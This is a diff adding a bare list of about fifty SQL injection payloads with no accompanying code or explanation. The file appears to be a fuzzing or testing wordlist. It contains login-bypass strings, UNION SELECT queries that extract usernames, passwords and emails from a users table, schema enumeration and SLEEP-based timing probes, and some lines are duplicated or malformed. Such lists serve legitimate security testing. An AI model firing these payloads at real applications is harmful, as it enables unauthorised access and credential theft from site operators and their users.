@@ -1,0 +1,50 @@
+OR '1'='1
+OR 'a'='a'
+OR 1=1 LIMIT 1 --
+OR 1=1 --
+OR 1=1# 
+AND 1=1 --
+AND 'a'='a' --
+UNION SELECT username, password FROM users --
+UNION SELECT NULL, username, password FROM users --
+' UNION SELECT null, null, database() --
+' UNION SELECT null, null, version() --
+' UNION SELECT null, table_name FROM information_schema.tables --
+' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password='password') --
+' AND 1=1 HAVING 1=1 --
+' AND 1=1 ORDER BY 1 --
+' UNION SELECT 1,2,3,4 --
+' UNION SELECT 1,2,3,4,5 --
+' UNION SELECT null, username, email FROM users --
+' UNION SELECT null, username, password, email FROM users --
+' AND 1=1 GROUP BY NULL --
+' AND 1=1 HAVING 1=1 --
+' OR '1'='1' LIMIT 0,1 --
+' AND 1=1 --+
+' AND username='admin' AND password='password' --
+' OR 'a'='a' AND 1=1 --
+' OR 1=1 AND SLEEP(5) --
+' OR 1=1 --+
+' AND 1=1 GROUP BY username, password --
+' AND '1'='1' UNION SELECT username, password FROM users --
+' UNION SELECT username, password FROM users --
+' OR 1=1 AND SELECT database() --
+' OR 1=1 AND SELECT user() --
+' OR 1=1 AND SELECT table_name FROM information_schema.tables --
+' UNION SELECT null, group_concat(username, ':', password) FROM users --
+' UNION SELECT null, group_concat(username) FROM users --
+' OR (SELECT COUNT(*) FROM users) > 0 --
+' OR (SELECT COUNT(*) FROM posts) > 1 --
+' AND 1=1 AND SLEEP(10) --
+' OR 'a'='a' AND SELECT username, password FROM users --
+' OR 'x'='x' AND SELECT * FROM users WHERE username='admin' --
+' AND 1=1 ORDER BY 1,2 --
+' OR (SELECT user()) FROM dual --
+' OR '1'='1' -- (test for login)
+' UNION SELECT NULL, user(), password FROM users --
+' OR (SELECT COUNT(*) FROM users WHERE username='guest') > 0 --
+' UNION SELECT null, email, password FROM users --
+' UNION SELECT null, username, COUNT(*) FROM posts WHERE user_id=1 --
+' OR 'a'='a' AND SELECT group_concat(username) FROM users --
+' UNION SELECT 1,2,3 FROM information_schema.tables --
+' UNION SELECT NULL, username, user_id FROM users WHERE user_id=1 --
